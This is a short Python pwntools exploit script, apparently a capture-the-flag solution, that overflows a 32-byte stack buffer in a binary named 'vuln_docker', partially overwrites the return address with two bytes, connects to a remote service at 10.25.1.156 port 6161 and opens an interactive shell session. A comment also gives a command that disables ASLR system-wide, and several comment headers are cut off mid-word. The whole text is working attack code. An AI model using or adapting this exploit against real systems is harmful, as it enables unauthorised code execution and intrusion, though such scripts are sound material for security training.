from pwn import *

# 1. Configuration
exe = './vuln_docker'
elf = ELF(exe)
context.binary = exe

# NOTE: If running locally, you can disable ASLR to simulate a fixed-base remote:
# $ sudo sysctl -w kernel.randomize_va_space=0

# 2. Start Process
# If remote, use: p = remote('host', port)
# p = process(exe)

# 3. Ha
# Offset: 32 bytes buffer + 8 bytes saved RBP = 40 bytes
padding = b'A' * 40

chain = padding + b'\x09\x73' # offset is 0x1309
p = remote('10.25.1.156', 6161)

# 6. Exploi
# Pass the length check (must be < 0x80)
p.sendlineafter(b"how many bytes do you need: \n", b"42")

# Send the chain
p.sendlineafter(b"hurry up: \n", chain)

p.interactive()